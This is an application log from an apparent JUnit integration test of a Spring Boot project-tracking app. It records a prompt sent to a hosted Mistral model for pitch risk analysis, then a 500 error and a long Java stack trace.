2026-01-17T23:26:46.438Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod request payload: {"input":{"max_tokens":2048,"temperature":0.3,"model":"mistral:instruct","prompt":"You are a project risk advisor for a software development team using the Shape Up methodology.\n\nAnalyze the following pitch and provide risk insights:\n\nPitch Title: Critical Pitch\nDescription: Test description for Critical Pitch\nAppetite: 10 days\nStatus: IN_PROGRESS\nProgress: 150.0%\nCycle Progress: 50.0%\nTeam: Health Test Team\n\nIdentified Risk Factors:\n- UNCLEAR_REQUIREMENTS: Pitch description is missing or too brief (Impact: 5/10)\n- SCOPE_CREEP: Hours spent exceed appetite by 50% (Impact: 7/10)\n\nProvide your analysis in the following format:\nINSIGHTS:\n- [insight 1]\n- [insight 2]\n- [insight 3]\n\nRECOMMENDATIONS:\n- [recommendation 1]\n- [recommendation 2]\n- [recommendation 3]\n\nCONFIDENCE: [0-100]\n\nKeep insights actionable and specific to this pitch."}}
2026-01-17T23:26:46.445Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod API call failed: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.443763","status":500}

java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.443763","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.generateAIInsights(RiskAnalysisService.java:588) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:145) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:94) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService$$SpringCGLIB$$0.analyzePitchRisk(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.buildPitchHealth(PitchHealthService.java:342) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getCycleHealthSummary$2(PitchHealthService.java:200) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getCycleHealthSummary(PitchHealthService.java:201) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService$$SpringCGLIB$$0.getCycleHealthSummary(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthController.getCycleHealthWithAI(PitchHealthController.java:57) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest.getCycleHealth_WithAI_ShouldReturnEnhancedAnalysis(PitchHealthControllerIntegrationTest.java:247) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
